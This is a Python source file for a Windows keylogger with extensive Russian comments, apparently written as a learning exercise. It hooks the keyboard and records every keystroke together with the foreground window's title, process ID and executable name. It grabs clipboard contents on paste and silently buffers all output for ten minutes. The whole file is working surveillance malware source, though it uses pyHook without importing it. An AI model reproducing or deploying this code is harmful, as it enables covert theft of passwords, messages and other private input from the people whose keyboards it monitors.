from ctypes import byref, create_string_buffer,  c_ulong, windll
from io import StringIO

import os
import pythoncom
import pynput
import sys
import time
import win32clipboard

TIMEOUT = 60*10



class KeyLogger:
    def __init__(self):
        self.current_window = None # инициализируем переменную
    """
    этот метод выполняет 3 функции: получает информацию об активном окне(PID, имя процесса, заголовок окна)
    сахраняет заголовок в атрибут current_window
    выводит всю информацию на консоль
    """
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow() # получаем айди активного окна
        pid = c_ulong(0) # ulong как в C# только храним тут целочисленные
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # тут мы передаем айди окна и передаем указатель куда будем сохранять результат. тут мы получаем айди процесса которое создало окно
        process_id = f'{pid.value}' # сохраняем айди процесса
        
        executable = create_string_buffer(512) # создаем буффер размером 512 байт для хранения пути к исполняемому файлу, такой буфер хранит массивы байтов
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) # при помощи Windows API открываем процесс по его айди (pid) и получаем его дескриптор, затем запрашиваем права доступа 0x400 позволяет получать
        # инфу о процессе, 0х10 позволяет читать память процесса, False означает что процесс не будет наследоваться
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # получаем название исполняемого файла по дескриптору процесса (h_process), None указывает что нам нужно именно имя исполняемого файла а не например dll,
        # затем передаем указатель на буфер byref(executable) где мы сохраняем название исполняемого файла а 512 указывает что это максимальная для записи в буфер длина что бы память не утекла
        window_title = create_string_buffer(512) # создаем еще один буфер
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # тут мы извлекаем заголовок онка по его айди(дескриптору hwnd), суффикс A перед функцией указываем что мы сохраняем результат в виде ANSI кодировки
        # ANSI кодировка это как ASCII но кроме латиницы, цифр и знаков препинаний сохраняет кирилицу и еще некоторые спец символы, затем передаем указатель на буфер byref(window_title) где будет храниться заголовок и указываем максимальный размер записи что бы не было утечек памяти
        try:
            self.current_window = window_title.value.decode() # берем буфер, извлекаем и декодируем заголовок извлеченный из него и сохраняем в переменную атрибут current_window
        except UnicodeDecodeError as e: # если декодировать не получилось по разным причинам то говорим что открыто неизвестное окно
            print(f'{e}: window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window) # выводим айди процесса, название исполняемого файла и заголовок активного окна

        windll.kernel32.CloseHandle(hwnd) # закрываем дескрипторы (айди) окна и процесса после завершения работы с ними что бы не нагружали компьютер
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event): # event это данные который передал hook manadger когда произошло нажатие. в переменной хранится какая клавиша нажата, в каком окне, в какой момент и т.д.
        if event.WindowName != self.current_window: # проверка что событие произошло в новом окне
            self.get_current_process() # вызываем метод который обновляет атрибут current_window и выводит доступную информацию об окне и процессе в консоль
        if 32 < event.Ascii < 127: # проверка позиции введенного символа в таблице ASCII все что не находится в указаном диапазон либо вспомогательные символи либо непечатные
            print(chr(event.Ascii), end='') # преобразуем пришедший нам ASCII код в букву например chr(111) = o
        else:
            if event.Key == 'V': # если пользователь нажал V то:
                win32clipboard.OpenClipboard() # открываем системный буфер обмена для последующего считывания информации
                value = win32clipboard.GetClipboardData() # считываем данные из буфера обмена
                win32clipboard.CloseClipboard() # закрываем буфер
                print(f'[PASTE] - {value}') # выводим что скопировал пользователь
            else:
                print(f'{event.Key}') # иначе если другая буква то просто выводим ее на консоль
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO() # сохраняем первоначальное состояние затем перехватываем все что должно вывести на консоль
    # все сохраняется в StringIO он же в свою очередь является виртуальным файлом который находится внутри оперативной памяти а не на диске
    kl = KeyLogger() # создаем объект кейлоггера
    hm = pyHook.HookManager() # создаем объект хук менеджера
    hm.KeyDown = kl.mykeystroke # говорим что при перехвате хука вызываем метод mykeystroke
    hm.HookKeyboard() # и говорим что работаем мы с клавиатурой
    while time.thread_time() < TIMEOUT: # цикл на проверку истечения таймера
        pythoncom.PumpWaitingMessages() # заглядывает в windows очередь что бы узнать какие события произошли во время отсутсвия. во время проверки программа приостанавливается
        
    log = sys.stdout.getvalue() # извлекаем все что накопилось в StringIO за время работы
    sys.stdout = save_stdout
    return log # возвращаем вывод в консоль и отправляем накопившиеся события
    
if __name__ == '__main__':
    print(run())
    print('done.')
    

